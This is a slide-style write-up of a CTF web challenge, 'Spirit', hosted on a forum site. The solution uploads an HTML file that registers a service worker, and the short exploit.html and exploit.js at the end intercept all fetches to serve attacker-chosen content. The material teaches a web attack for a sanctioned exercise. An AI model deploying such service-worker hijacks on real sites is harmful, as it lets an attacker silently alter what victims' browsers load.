title: Spirit
---

# Spirit (Web 200)
Robert Chen

---
# Problem Description
*Written by __okulkarni__*

> My friend and I use [this forum website](https://spirit.tjctf.org/) to communicate in private. Recently, I noticed people becoming suspicious of me, so I told him to stop sending me flags. I also told him I would update this file when the coast was clear. Every time he opens his browser, he opens [this file](https://media_storage.tjctf.org/mymsg_private.txt) to check if he can keep sending files. Try to convince him to send you the flag by replacing the contents of that file with The coast is clear. so that he isn't suspicious when he checks and puts the flag on your profile page.

---
# Initial Thoughts
1. Root the server
2. DNS poisoning (way too hard)

_Disclaimer: I was completely wrong_

---
# Basics
Url: <https://spirit.tjctf.org/>
Github: <https://github.com/nitely/Spirit>

---
# Recon
Issue tracker: <https://github.com/nitely/Spirit/issues>
Nothing useful here..
> No way they want us to find a novel exploit right? 

---
# More Recon
Time to actually use the site!
(make an account guys)

---
# Reporting Files?!?
1. You click report
2. Admin visits page
3. You inject Javascript (XSS)
4. ?
5. Profit!

---
# More Recon

`ctf_level = recon_level + 0.01 * skill`

What's unusual? 

<img src="data:image/png;base64,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" />



---
# Service Workers
__Gaunt 19__
> A service worker is a script that your browser runs in the background, separate from a web page, opening the door to features that don't need a web page or user interaction.

We can listen for certain events, such as...

---
# Fetch
Used for every network request the browser makes, e.g.
1. Loading images
2. Opening a webpage
3. Loading a text file

---
# Idea
Use service workers to intercept the request to `/mymsg_private.txt`, and respond with `The coast is clear.`

---
# Implementation
**exploit.html**
```html
<script>
navigator.serviceWorker.register('/uploaded-path/exploit.js', {scope: "/"});
</script>
```
**exploit.js**
```javascript
self.addEventListener('fetch', event => {
    event.respondWith(fetch("/uploaded-path/coast-is-clear.txt"));
  }
)
```
**coast-is-clear.txt**
```
The coast is clear.
```

---
# Conclusions
1. Exploits don't have to be complex
2. Recon is important
3. "Reporting stuff" in ctfs is usually relevant
4. 
---
# Questions / Feedback?
